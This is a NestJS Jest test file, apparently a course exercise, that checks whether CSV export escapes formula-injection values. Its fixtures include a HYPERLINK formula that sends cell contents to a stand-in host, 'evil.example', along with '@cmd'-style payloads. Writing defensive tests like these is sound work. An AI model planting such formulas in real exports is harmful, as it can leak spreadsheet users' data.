import { INestApplication } from '@nestjs/common';
import { csvCell, csvLine } from '../../src/uploads/csv';
import { ProductsService } from '../../src/products/products.service';
import { createTestApp, http } from './_kit';
import { KEY } from './_fixtures';

describe('C12 ex07 · 🔴 "Kế toán mở CSV bằng Excel, máy bị chạy lệnh"', () => {
  describe('csvCell / csvLine', () => {
    it('chuỗi thường giữ nguyên; null/undefined → rỗng; số → chuỗi số', () => {
      expect(csvCell('Áo thun')).toBe('Áo thun');
      expect(csvCell(null)).toBe('');
      expect(csvCell(undefined)).toBe('');
      expect(csvCell(0)).toBe('0');
      expect(csvCell(-5)).toBe('-5'); // SỐ âm không phải công thức
      expect(csvCell(false)).toBe('false');
    });
    it('dấu phẩy, nháy kép, xuống dòng → bao trong "..." và nhân đôi nháy kép', () => {
      expect(csvCell('a,b')).toBe('"a,b"');
      expect(csvCell('nói "xin chào"')).toBe('"nói ""xin chào"""');
      expect(csvCell('dòng 1\ndòng 2')).toBe('"dòng 1\ndòng 2"');
      expect(csvCell('dòng 1\r\ndòng 2')).toBe('"dòng 1\r\ndòng 2"');
      expect(csvCell(' khoảng trắng đầu')).toBe('" khoảng trắng đầu"');
    });
    it('CHUỖI bắt đầu bằng = + - @ tab CR bị vô hiệu hóa công thức bằng dấu nháy đơn đứng trước', () => {
      expect(csvCell('=1+1')).toBe("'=1+1");
      expect(csvCell('+84901234567')).toBe("'+84901234567");
      expect(csvCell('-2+3')).toBe("'-2+3");
      expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
      expect(csvCell('\t=cmd').startsWith("'") || csvCell('\t=cmd').startsWith(`"'`)).toBe(true);
      expect(csvCell('=HYPERLINK("http://evil","click")')).toBe(`"'=HYPERLINK(""http://evil"",""click"")"`);
    });
    it('csvLine nối bằng dấu phẩy và kết thúc CRLF', () => {
      expect(csvLine(['a', 1, null, 'b,c'])).toBe('a,1,,"b,c"\r\n');
    });
  });

  describe('trong file xuất', () => {
    let app: INestApplication;
    beforeAll(async () => {
      app = await createTestApp();
      const p = app.get(ProductsService, { strict: false });
      await p.create({ sku: 'EVIL-1', name: '=HYPERLINK("http://evil.example/?x="&A1,"Bấm vào")', price: 1, brand: '@cmd' });
      await p.create({ sku: 'EVIL-2', name: 'Áo, size "L"\nmàu đen', price: 2 });
      await p.create({ sku: 'EVIL-3', name: '+84 901 234 567', price: 3 });
    });
    afterAll(async () => {
      await app.close();
    });

    it('ô tên/hãng bắt đầu bằng ký tự công thức đều bị vô hiệu hóa; số vẫn là số', async () => {
      const text = (await http(app).get('/v1/exports/products.csv').set('x-api-key', KEY).expect(200)).text;
      expect(text).toContain(`"'=HYPERLINK(""http://evil.example/?x=""&A1,""Bấm vào"")"`);
      expect(text).toContain(",'@cmd,");
      expect(text).toContain(",'+84 901 234 567,");
      expect(text).not.toMatch(/(^|,|\r\n)=HYPERLINK/);
    });

    it('dấu phẩy, nháy kép và xuống dòng trong tên không làm lệch cột', async () => {
      const text = (await http(app).get('/v1/exports/products.csv').set('x-api-key', KEY).expect(200)).text;
      expect(text).toContain('"Áo, size ""L""\nmàu đen"');
    });

    it('tiếng Việt có dấu nguyên vẹn (UTF-8)', async () => {
      const text = (await http(app).get('/v1/exports/products.csv').set('x-api-key', KEY)).text;
      expect(text).toContain('Bấm vào');
    });
  });
});
